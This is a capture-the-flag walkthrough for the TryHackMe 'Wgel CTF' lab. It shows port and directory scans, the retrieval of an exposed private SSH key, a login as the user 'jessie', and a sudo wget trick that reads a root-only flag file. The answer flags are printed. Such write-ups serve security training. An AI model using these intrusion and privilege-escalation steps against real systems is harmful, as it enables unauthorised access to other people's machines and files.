# Wgel CTF

# Task 1

### 1 -- User flag

Nmap scan to see all that is open:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Wgel CTF$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 15:27 MDT
Nmap scan report for 10.10.146.14
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.55 seconds
```

So we have a webserver, and when browsing to it we just get the default apache homepage. Inspecting the HTML source gives us a hint on who one of the device's users might be:


![jessie](https://user-images.githubusercontent.com/32188816/82766023-c31a5100-9dd8-11ea-8795-2891a30e6da4.png)


Let's check out what is on port 80 with a little gobuster:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Wgel CTF$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.14
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 15:27:33 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/sitemap (Status: 301)
===============================================================
2020/05/24 15:28:50 Finished
===============================================================
```

Checking out `/sitemap` with another gobuster scan we find a `/.ssh` directory:

```bash
===============================================================
jeffrowell@kali:~/Documents/TryHackMe/Wgel CTF$ gobuster dir -u http://$IP/sitemap -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.14/sitemap
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 15:30:11 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
===============================================================
2020/05/24 15:31:20 Finished
===============================================================
```

Browsing to that `/sitemap/.ssh` directory we see that we have a private SSH key!

![sshkey](https://user-images.githubusercontent.com/32188816/82766048-fe1c8480-9dd8-11ea-84d7-69492aab7657.png)

![ssh_key_contents](https://user-images.githubusercontent.com/32188816/82766074-21473400-9dd9-11ea-8431-a848b43c9871.png)

Now we can try to log into the box. Let's try to login as the `jessie` user with the private key we just found.

```bash
jeffrowell@kali:~/Documents/TryHackMe/Wgel CTF$ ssh $IP -i id_rsa -l jessie
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
```

And we are in! Looking around jeesie's directories we can easily find the user flag:
```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Desktop/
jessie@CorpOne:~/Desktop$ ls
jessie@CorpOne:~/Desktop$ ls -a
.  ..
jessie@CorpOne:~/Desktop$ cd ../Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```



### 2 -- Root flag

First let us see if we can run any commands with root privileges:

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Cool, so we can run any command with root but that requires a password, which we don't have. But we can run wget as root. We could look at GTFOBins and see how to leverage this to get a root shell or persistent privilege access, but we can easily just tell wget to try and read URLs from the `/root/root_flag.txt` file and that gives us the flag:

```bash
jessie@CorpOne:~/Documents$ sudo wget --input-file /root/root_flag.txt
--2020-05-25 01:00:33--  http://b1b968b37519ad1daa6408188649263d/
Resolving b1b968b37519ad1daa6408188649263d (b1b968b37519ad1daa6408188649263d)... failed: Name or service not known.
wget: unable to resolve host address ‘b1b968b37519ad1daa6408188649263d’
```
